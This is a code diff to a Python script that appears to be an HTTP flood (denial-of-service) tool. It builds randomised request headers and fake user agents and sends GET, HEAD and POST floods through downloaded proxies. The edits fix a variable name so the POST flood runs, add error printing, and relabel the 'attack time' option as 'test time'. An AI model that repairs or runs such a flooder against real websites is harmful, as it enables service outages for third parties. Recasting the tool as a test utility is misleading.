@@ -9,6 +9,7 @@ import sys
 import ssl
 import datetime
 import os
+import string
 
 
 
@@ -111,11 +112,11 @@ def getuseragent():
 	elif platform == 'Windows':
 		rand = Intn(0, 100)
 		if rand > 90:
-			os  = Choice(['WindowsCE', 'Windows XP', 'Windows 7'])
+			os = Choice(['WindowsCE', 'Windows XP', 'Windows 7'])
 		else:
-			os  = Choice(['Windows 8', 'Windows NT 10.0; Win64; x64'])
+			os = Choice(['Windows 8', 'Windows NT 10.0; Win64; x64'])
 	elif platform == 'X11':
-		os  = Choice(['Linux i686', 'Linux x86_64'])
+		os = Choice(['Linux i686', 'Linux x86_64'])
 	browser = Choice(['chrome', 'firefox', 'ie'])
 	if browser == 'chrome':
 		webkit = str(Intn(500, 599))
@@ -154,6 +155,7 @@ def GenReqHeader(method):
 	global data
 	global target
 	global path
+
 	header = ""
 	sec = ""
 
@@ -180,7 +182,7 @@ def GenReqHeader(method):
 	if method == "get" or method == "head":
 		connection = "Connection: Keep-Alive\r\n"
 		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
-		header =  referer + useragent + accept + connection + sec + "\r\n"
+		header = referer + useragent + accept + connection + sec + "\r\n"
 	elif method == "post":
 		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
 		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
@@ -188,7 +190,7 @@ def GenReqHeader(method):
 		if data == "":# You can enable customize data
 			data = str(random._urandom(16))
 		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
-		header = post_host + accept + refer + content + user_agent + sec + length + "\n" + data + "\r\n\r\n"
+		header = post_host + accept + refer + content + useragent + sec + length + "\n" + data + "\r\n\r\n"
 	return header
 
 def ParseUrl(original_url):
@@ -270,9 +272,11 @@ def cc(event,proxy_type,proxy_timeout):
 						break
 				#s.setsockopt(socket.SO_LINGER,0)
 				s.close()
-			except:
+			except Exception as ex:
+				print(str(ex))
 				s.close()
-		except:
+		except Exception as ex:
+			print(str(ex))
 			s.close()
 
 def head(event,proxy_type,proxy_timeout):
@@ -591,7 +595,7 @@ def PrintHelp():
    -f        | set proxies file (default:proxy.txt)
    -b        | enable/disable brute mode
              | Enable=1 Disable=0  (default:0)
-   -s        | set attack time(0 to inf, default:inf)
+   -s        | set test time(0 to inf, default:inf)
    -p		 | set proxy timeout in seconds (default 3)
    -down     | download proxies
    -check    | check proxies
